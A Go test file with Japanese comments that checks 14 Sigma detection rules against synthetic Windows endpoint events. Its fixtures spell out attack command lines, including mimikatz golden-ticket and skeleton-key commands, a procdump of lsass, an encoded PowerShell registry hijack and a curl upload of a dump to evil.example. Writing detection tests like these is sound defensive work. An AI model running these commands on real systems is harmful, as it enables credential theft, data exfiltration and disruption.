package detection

import "testing"

// migration 385 が入れた 14 ルールが、**エージェントが実際に出す形のイベント**で
// 発火することを確かめる。趣旨は wave1 と同じ（dark_technique_wave1_test.go の
// 冒頭コメントを参照）——フィールド解決の検査は合成イベントに対する判定なので、
// 「値が届くか」は別に確かめる必要がある。
//
// wave2 は wave1 と違い process_creation 以外の経路を使うルールを含む。
// それぞれの供給元は:
//
//	image_load    handler.go:1285-1290  image_loaded / signature_status / signer
//	registry_set  handler.go:1249-1251  keyPath / value_data
//	ParentImage   alert_pipeline.go の parentResolver が ppid から解決し
//	              parent_process を注入する（agent は親の実行パスを送らない）
//
// ParentImage を使う 2 件は、その parentResolver 注入後の形——つまり
// parent_process が入った状態——を再現している。ここを agent の生イベントだけで
// 組むと通らないが、それは本番の経路を再現していないだけである。
func TestDarkTechniqueWave2RulesFire(t *testing.T) {
	blocks := migrationSigmaBlocks(t)

	cases := []struct {
		title string
		event map[string]interface{}
	}{
		{
			title: "Audio Capture Tooling",
			event: map[string]interface{}{
				"type":         "process",
				"image":        `C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe`,
				"command_line": `powershell -c "Get-AudioDevice; SoundRecorder /FILE out.wav"`,
			},
		},
		{
			title: "Core System Binary Masquerade by Location",
			event: map[string]interface{}{
				"type":               "process",
				"image":              `C:\Users\v\AppData\Local\Temp\svchost.exe`,
				"command_line":       `svchost.exe -k netsvcs`,
				"original_file_name": "svchost.exe",
			},
		},
		{
			title: "DLL Search-Order Hijack of Commonly-Abused System DLL",
			event: map[string]interface{}{
				"type":             "image_load",
				"image_loaded":     `C:\Users\v\AppData\Local\Temp\app\version.dll`,
				"signature_status": "unsigned",
			},
		},
		{
			title: "Default File Association Hijack",
			event: map[string]interface{}{
				"type":       "registry",
				"keyPath":    `HKCR\txtfile\shell\open\command\(Default)`,
				"value_data": `powershell -enc SQBFAFgA`,
			},
		},
		{
			title: "Forced System Shutdown or Reboot",
			event: map[string]interface{}{
				"type":         "process",
				"image":        `C:\Windows\System32\shutdown.exe`,
				"command_line": `shutdown /r /f /t 0`,
			},
		},
		{
			title: "Kerberos Golden or Silver Ticket Forging",
			event: map[string]interface{}{
				"type":         "process",
				"image":        `C:\Users\v\mimikatz.exe`,
				"command_line": `mimikatz.exe "kerberos::golden /user:Administrator /domain:corp /krbtgt:..."`,
			},
		},
		{
			title: "Logon Script Persistence via UserInitMprLogonScript",
			event: map[string]interface{}{
				"type":       "registry",
				"keyPath":    `HKCU\Environment\UserInitMprLogonScript`,
				"value_data": `C:\Users\v\evil.cmd`,
			},
		},
		{
			title: "Renamed Dual-Use Admin Tool by PE OriginalFileName",
			event: map[string]interface{}{
				"type": "process",
				// ルールは selection(OriginalFileName) and not filter(Image) なので、
				// 「正しい名前で置かれていない」ことが要件。名前を変えた procdump。
				"image":              `C:\Users\v\svc.exe`,
				"command_line":       `svc.exe -ma lsass.exe out.dmp`,
				"original_file_name": "procdump.exe",
			},
		},
		{
			title: "Renamed Offensive Tool by PE OriginalFileName",
			event: map[string]interface{}{
				"type":               "process",
				"image":              `C:\Users\v\update.exe`,
				"command_line":       `update.exe`,
				"original_file_name": "mimikatz.exe",
			},
		},
		{
			title: "Skeleton Key or In-memory SSP Credential Logging",
			event: map[string]interface{}{
				"type":         "process",
				"image":        `C:\Users\v\mimikatz.exe`,
				"command_line": `mimikatz.exe "misc::skeleton" exit`,
			},
		},
		{
			title: "System DLL Name Signed by Non-Microsoft Publisher",
			event: map[string]interface{}{
				"type": "image_load",
				// filter_system が \Windows\System32\ 等を除外する。狙いは
				// 「システム DLL の名前を持つものが非システムパスから読まれる」状況。
				"image_loaded":     `C:\Users\v\app\wininet.dll`,
				"signature_status": "valid",
				"signer":           "Evil Corp Ltd",
			},
		},
		{
			// parentResolver 注入後の形（parent_process → ParentImage）
			title: "UAC Bypass via Auto-Elevating Binary",
			event: map[string]interface{}{
				"type":           "process",
				"image":          `C:\Windows\System32\cmd.exe`,
				"command_line":   `cmd /c whoami`,
				"ppid":           float64(4242),
				"parent_process": `C:\Windows\System32\fodhelper.exe`,
			},
		},
		{
			// 同上
			title: "Web Browser Spawning a Command Shell",
			event: map[string]interface{}{
				"type":           "process",
				"image":          `C:\Windows\System32\cmd.exe`,
				"command_line":   `cmd /c powershell -enc ...`,
				"ppid":           float64(1337),
				"parent_process": `C:\Program Files\Google\Chrome\Application\chrome.exe`,
			},
		},
		{
			title: "Windows Data Exfiltration via curl.exe or bitsadmin Upload",
			event: map[string]interface{}{
				"type":         "process",
				"image":        `C:\Windows\System32\curl.exe`,
				"command_line": `curl.exe -T C:\data\dump.zip https://evil.example/upload`,
			},
		},
	}

	if len(cases) != 14 {
		t.Fatalf("migration 385 は 14 ルールを入れる。ケースが %d 件しかない——"+
			"ルールを足したらここも足すこと", len(cases))
	}

	for _, tc := range cases {
		t.Run(tc.title, func(t *testing.T) {
			blk, ok := blocks[tc.title]
			if !ok {
				t.Fatalf("ルール %q が migration から消えている。改名したなら削除ではなく "+
					"このテストの参照先を張り替えること（守っているのは名前ではなく発火である）", tc.title)
			}

			ev := NewSigmaEvaluator()
			if err := ev.LoadRule(blk.body); err != nil {
				t.Fatalf("%s のロードに失敗: %v", blk.file, err)
			}

			event := make(map[string]interface{}, len(tc.event))
			for k, v := range tc.event {
				event[k] = v
			}
			addPipelineSigmaAliases(event)

			for _, m := range ev.EvaluateEvent(event) {
				if m.RuleTitle == tc.title {
					return
				}
			}
			t.Errorf("%q が発火しなかった。フィールド解決の検査が緑でも、値が届かなければ "+
				"永久に不発火である——このテストはその差を見るために在る。\nイベント: %v",
				tc.title, event)
		})
	}
}
